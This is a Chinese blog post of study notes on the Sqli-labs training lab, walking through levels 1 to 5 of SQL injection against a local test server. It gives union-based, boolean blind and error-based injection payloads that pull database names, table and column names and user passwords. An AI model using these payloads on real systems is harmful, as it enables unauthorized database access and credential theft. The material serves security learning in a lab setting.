<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head><meta name="generator" content="Hexo 3.8.0">

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->

    

    
        <meta name="description" content="前言之前就有学习过一些关卡，但是由于当时没有搭建博客的想法，所以也就没有写下来属于自己的笔记。现在博客搭建完成了，从第一关开始，重新写下所有关卡的笔记，并且向后学习。
关于SQL注入的基础知识，可以看我自己整理的文章：Sqli-labs Tips

数据库名、表名、列名因为是学习用的，所以先告诉大家">
    

    <!--Author-->
    
        <meta name="author" content="Huang-ShuWei(Knlvre)">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="Sqli-labs(第1-10关)">
    

    <!--Open Graph Description-->
    
        <meta property="og:description" content="前言之前就有学习过一些关卡，但是由于当时没有搭建博客的想法，所以也就没有写下来属于自己的笔记。现在博客搭建完成了，从第一关开始，重新写下所有关卡的笔记，并且向后学习。
关于SQL注入的基础知识，可以看我自己整理的文章：Sqli-labs Tips

数据库名、表名、列名因为是学习用的，所以先告诉大家">
    

    <!--Open Graph Site Name-->
        <meta property="og:site_name" content="Knlvre">

    <!--Type page-->
    
        <meta property="og:type" content="article">
    

    <!--Page Cover-->
    
    
        <meta property="og:image" content="https://knlvre.github.io/Knlvre.github-iohttp://img.sj33.cn/uploads/allimg/200912/20091206235017574.jpg">
    

        <meta name="twitter:card" content="summary_large_image">

    

    
        <meta name="twitter:image" content="https://knlvre.github.io/Knlvre.github-iohttp://img.sj33.cn/uploads/allimg/200912/20091206235017574.jpg">
    

    <!-- Title -->
    
    <title>Sqli-labs(第1-10关) - Knlvre</title>

    <!-- Bootstrap Core CSS -->
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/Knlvre.github-io/css/style.css">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">

    <!-- Google Analytics -->
    


    <!-- favicon -->
    

</head>


<body>

    <!-- Menu -->
    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/Knlvre.github-io/">Knlvre</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
                
                    <li>
                        <a href="/Knlvre.github-io/">
                            
                                首页
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/Knlvre.github-io/archives">
                            
                                归档
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="/Knlvre.github-io/tags">
                            
                                标签
                            
                        </a>
                    </li>
                
                    <li>
                        <a href="https://github.com/Knlvre/Knlvre.github-io">
                            
                                <i class="fa fa-github fa-stack-2x"></i>
                            
                        </a>
                    </li>
                
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>

    <!-- Main Content -->
    <!-- Page Header -->
<!-- Set your background image for this header in your post front-matter: cover -->

<header class="intro-header" style="background-image: url('http://pic.netbian.com/uploads/allimg/181130/224234-154358895470e3.jpg')">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <div class="post-heading">
                    <h1>Sqli-labs(第1-10关)</h1>
                    
                    <h2 class="post-subheading">
                        Sqli-labs 第1-10关的学习笔记
                    </h2>
                    
                    <span class="meta">
                        <!-- Date and Author -->
                        
                            Posted by Knlvre on
                        
                        
                            2019-01-29
                        
                    </span>
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">

            <!-- Tags and categories -->
           
                <div class="col-lg-4 col-lg-offset-2 col-md-5 col-md-offset-1 post-tags">
                    
                        


<a href="/Knlvre.github-io/tags/Sqli-labs/">#Sqli-labs</a>


                    
                </div>
                <div class="col-lg-4 col-md-5 post-categories">
                    
                </div>
            

            <!-- Gallery -->
            

            <!-- Post Main Content -->
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前就有学习过一些关卡，但是由于当时没有搭建博客的想法，所以也就没有写下来属于自己的笔记。现在博客搭建完成了，从第一关开始，重新写下所有关卡的笔记，并且向后学习。</p>
<p>关于SQL注入的基础知识，可以看我自己整理的文章：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a></p>
<hr>
<h2 id="数据库名、表名、列名"><a href="#数据库名、表名、列名" class="headerlink" title="数据库名、表名、列名"></a>数据库名、表名、列名</h2><p>因为是学习用的，所以先告诉大家这个基于<strong>phpstudy</strong>搭建的<strong>sqli-labs</strong>学习过程中，较频繁使用的重要的数据库名、表名、列名：</p>
<p>数据库名：security</p>
<p>security下的表名：emails，referers，uagents，users</p>
<p>users下的列名：id，username，password</p>
<hr>
<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less - 1"></a>Less - 1</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试。ps：注意后面这个<strong>单引号</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure>
<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-1.png" alt="1-1"></p>
<p>查看 <code>index.php</code> 文件内对于参数<code>ID</code>的处理，和我们猜想的一样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<code>单引号</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;1&apos;&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>既然多了一个<code>单引号</code>会出现报错，那想办法将这个单引号去掉，会不会不报错并且正常显示呢，试一下 <code>&#39; or 1=1 --+</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos; or 1=1 --+</span><br></pre></td></tr></table></figure>
<p>如果这个参数传入成功，sql语句就会变成如下这样，这条语句因or 1=1所以为永恒真</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;1&apos; or 1=1 --+&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>回车后就可以看到返回的内容：</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-2.png" alt="1-2"></p>
<p>可以看到我们通过 <strong>–+</strong> 将这个多出来的<strong>单引号</strong>给注释掉了，成功返回内容</p>
<p>那么我们就可以利用这点，执行其他我们想要执行的语句，比如 <strong>order by</strong>  (关于order by 开头有做简单介绍)</p>
<p>首先，我们看到 <strong>security-users</strong> 表有3列</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-3.png" alt="1-3"></p>
<p>如果我们执行 <strong>order by 3</strong> 就会成功，如果超过3就会失败，比如 <strong>order by 4</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos; order by 3 --+</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos; order by 4 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-4.png" alt="1-4"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-5.png" alt="1-5"></p>
<p>那么此时我们就知道了，可以利用这一点来猜某个表中有多少列</p>
<p>当id的数据在数据库中不存在时，前台页面返回了我们构造的union 的数据。此时我们可以id=-1，两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,2,3 --+</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,2,3,4 --+</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：因为前面我们已经通过 <strong>order by 3</strong> 知道该表有3列，所以这里要 <strong>select 1,2,3</strong> 不然会出错</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-6.png" alt="1-6"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-7.png" alt="1-7"></p>
<p>此时我们就可以利用显示的位置，然后通过利用文章开头介绍的<strong>常用函数</strong>，来获取我们需要的信息，比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,version(),database() --+</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos; union select 1,@@version_compile_os,@@datadir --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-8.png" alt="1-8"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-9.png" alt="1-9"></p>
<p>结合前面的关于 <strong>information_schema</strong>  的知识，利用 <strong>union</strong> 命令进行联合注入（层层深入）</p>
<p>爆所有数据库名（第一层）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,group_concat(schema_name),3 from information_schema.schemata --+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-10.png" alt="1-10"></p>
<p>爆security数据库的所有表名（第二层）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,group_concat(table_name),3 from information_schema.tables where table_schame=&apos;security&apos;--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,group_concat(table_name),3 from information_schema.tables where table_schame=&apos;security&apos; --+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-11.png" alt="1-11"></p>
<p>爆users表的所有列名（第三层）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-12.png" alt="1-12"></p>
<p>爆具体数据（第四层）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造URL：</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=-1&apos;union select 1,username,password from users where id=1--+</span><br><span class="line"></span><br><span class="line">如果这个参数传入成功，sql语句：</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;-1&apos;union select 1,username,password from users where id=1--+ &apos;LIMIT 0,1&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/1-13.png" alt="1-13"></p>
<hr>
<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less - 2"></a>Less - 2</h2><p>同样的构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=1&apos;</span><br></pre></td></tr></table></figure>
<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/2-1.png" alt="2-1"></p>
<p>所以这里应该是因为，<strong>奇数个单引号</strong>破坏了查询，导致抛出错误。因此我们得出的结果是，查询代码使用了整数</p>
<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>单引号</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=1&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>所以这关就不需要对<strong>单引号</strong>的问题进行处理，直接尝试进行注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/2-2.png" alt="2-2"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/2-3.png" alt="2-3"></p>
<hr>
<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less - 3"></a>Less - 3</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-3/?id=1&apos;</span><br></pre></td></tr></table></figure>
<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/3-1.png" alt="3-1"></p>
<p>因此我们得出的结果是，查询代码使用了 <strong>(‘id’)</strong> 对参数进行了处理</p>
<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>单引号</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&apos;1&apos;&apos;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>所以这关就需要通过处理掉这个<strong>(‘$id’)</strong>，尝试进行注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-3/?id=-1&apos;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/3-2.png" alt="3-2"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1&apos;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/3-3.png" alt="3-3"></p>
<hr>
<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less - 4"></a>Less - 4</h2><p>构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试。发现没有返回报错信息，并尝试<strong>两个单引号</strong>，也是如此.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;</span><br><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;&apos;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-1.png" alt="4-1"></p>
<p>知道将<strong>单引号</strong>改成<strong>双引号</strong>报错信息才出现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>
<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-2.png" alt="4-2"></p>
<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = &apos;&quot;&apos; . $id . &apos;&quot;&apos;;</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>双引号</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=(&quot;id&quot;&quot;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>尝试进行注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1&quot;) union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-3.png" alt="4-3"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-2/?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/4-4.png" alt="4-4"></p>
<hr>
<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less - 5"></a>Less - 5</h2><p>这关开始，后面的几关开始接触到盲注了。关于盲注的知识可以看这篇博客的Tip 2部分：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a></p>
<p>老规矩，构造URL，传入<strong>id</strong>参数，赋值为<strong>1’</strong>，进行尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-1/?id=1&apos;</span><br></pre></td></tr></table></figure>
<p>回车后我们得到了一个Mysql返回的错误，提示我们语法错误，我们通过这个猜出SQL语句对<strong>ID</strong>这个参数的处理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-1.png" alt="5-1"></p>
<p>所以这里应该是因为，<strong>奇数个单引号</strong>破坏了查询，导致抛出错误。</p>
<p>查看 <strong>index.php</strong> 文件内对于参数<strong>ID</strong>的处理，和我们猜想的一样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>如果这个参数传入成功，SQL语句就会变成如下这样，多了一个<strong>单引号</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;1&apos;&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<p>（1）布尔注入</p>
<p>使用<strong>length()函数</strong>猜测数据库的长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and length(database())=7 --+</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and length(database())=8 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-2.png" alt="5-2"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-3.png" alt="5-3"></p>
<p>使用<strong>substr()函数</strong>猜测数据库的名称</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)=&apos;a&apos;</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)&gt;&apos;a&apos;</span><br><span class="line"></span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)=&apos;s&apos;</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,1)&gt;&apos;s&apos;</span><br><span class="line"></span><br><span class="line">同样，改变substr()函数里的参数，就可以截取想要猜测的字符，就这样一个个字符爆出来</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,5)=&apos;secur&apos;</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),1,8)=&apos;security&apos;</span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-2/?id=1 and substr(database(),3,6)=&apos;curity&apos;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-4.png" alt="5-4"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-5.png" alt="5-5"></p>
<p>当然也可以使用这种方法来<strong>爆表名、列名、数据</strong>等</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)&gt;&apos;a&apos; --+</span><br><span class="line">错误：http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)&gt;&apos;e&apos; --+</span><br><span class="line"></span><br><span class="line">正确：http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,6)=&apos;emails&apos; --+</span><br><span class="line">//当猜测出第一个表之后，改成limit 1,1 就可以猜测第二个表。关于limit的用法，不懂的话记得看前面有链接的Tips文章</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-6.png" alt="5-6"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/1-10/5-7.png" alt="5-7"></p>
<p>（2）报错注入</p>
<p>xpath报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/AAsqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+</span><br><span class="line">//爆数据库名称</span><br></pre></td></tr></table></figure>
